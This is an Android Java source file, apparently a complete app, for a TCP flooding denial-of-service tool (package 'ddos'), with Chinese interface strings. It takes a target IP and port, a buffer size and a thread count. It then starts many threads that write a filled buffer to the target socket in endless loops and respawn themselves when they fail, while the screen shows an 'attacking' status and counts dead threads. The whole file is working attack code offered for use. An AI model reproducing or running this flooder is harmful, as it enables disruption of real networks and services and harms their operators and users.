package com.greyCloud.ddos;

import android.app.*;
import android.os.*;
import android.widget.*;
import android.view.*;
import android.view.View.*;
import java.net.*;
import android.support.v7.app.ActionBarActivity;
import java.io.*;

public class MainActivity extends ActionBarActivity
{
	public static byte[] buffer;
	public static ProgressDialog pd;
	public static String ipS;
	TextView kill;
	public static int port;
	public static long killN=0;
	private Handler uiHandler = new Handler();
	AlertDialog dialog;
	//MyHandler mHandler = new MyHandler();
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
				Button btn1 = (Button) findViewById(R.id.button1);
        //监听button事件
				pd=new ProgressDialog(this);
				dialog=new AlertDialog.Builder(this).create();
        btn1.setOnClickListener(new OnClickListener() {
					@Override
					public void onClick(View v) {
						pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
						pd.setCanceledOnTouchOutside(false);
						pd.setMessage("初始化...");
						pd.show();
						try{
						Thread.sleep(2000);
						}catch(Exception e){}
						Thread2 t=new Thread2();
						t.start();
					}
					
				class Thread1 extends Thread{
					@Override
					public void run(){
						try {
							Socket s=new Socket(MainActivity.ipS,MainActivity.port);
							//流准备
							OutputStream os=s.getOutputStream();
							DataOutputStream dos=new DataOutputStream(os);
							while(true) {
								dos.write(MainActivity.buffer);
								dos.flush();
							}
						}catch(Exception e) {
							MainActivity.killN++;
							//MainActivity.kill.setText("正在攻击，当前已死亡线程:"+MainActivity.killN);
							Runnable runnable = new Runnable() {
								@Override
								public void run() {
									
									//System.out.println("Runnable thread id " + Thread.currentThread().getId());
									MainActivity.this.kill.setText("正在攻击，当前已死亡线程\n"+MainActivity.killN);
								}
							};
							uiHandler.post(runnable);
							//System.out.println("线程死亡，重生！"+e.getMessage());
							//Runnable thread1 = new Thread1(); 
							Thread thread2 = new Thread1();
							thread2.start();//启动线程
						}
					}
				}
					class Thread2 extends Thread{
						@Override
						public void run(){
							Runnable runnable = new Runnable() {
								@Override
								public void run() {
									//System.out.println("Runnable thread id " + Thread.currentThread().getId());
									LinearLayout ll;
									EditText ip=null;
									int b=0;
									EditText thread;
									EditText buff=null;
									try{
										ll=(LinearLayout)findViewById(R.id.ll);
										kill=(TextView)findViewById(R.id.killThread);
										ip=(EditText)findViewById(R.id.ip);
										buff=(EditText)findViewById(R.id.buff);
										thread=(EditText)findViewById(R.id.thread);
									}catch(Exception e){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("初始化失败："+e.getMessage());
										dialog.show();
										return;
									}
									pd.setMessage("解析ip...");
									String[] temp=ip.getText().toString().split(":");
									if(temp.length!=2){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("ip格式错误");
										dialog.show();
										return;
									}
									ipS=temp[0];
									try{
										b=Integer.parseInt(buff.getText().toString());
									}catch(Exception e){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("缓冲大小错误");
										dialog.show();
										return;
									}
									port=Integer.parseInt(temp[1]);
									pd.show();
									pd.setMessage("正在创建缓冲区...");
									try{
										buffer=new byte[1024*b];
										for(int i=0;i<1024*b;i++) {
											buffer[i]=127;
										}
									}catch(Exception e){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("创建缓冲区时发生错误："+e.getMessage());
										dialog.show();
										return;
									}
									pd.setMessage("正在释放线程...");
									try{
										int t=Integer.parseInt(thread.getText().toString());
										for(int i=0;i<t;i++) {
											//Runnable thread1 = new Thread1(); 
											Thread1 thread2 = new Thread1();
											thread2.start();//启动线程
										}
									}catch(Exception e){
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("释放线程时发生错误："+e.getMessage());
										dialog.show();
										return;
									}
									MainActivity.pd.cancel();
									ll.setVisibility(View.VISIBLE);
									}
							};
							uiHandler.post(runnable);
							
						}
					}
				});
		
    }
}
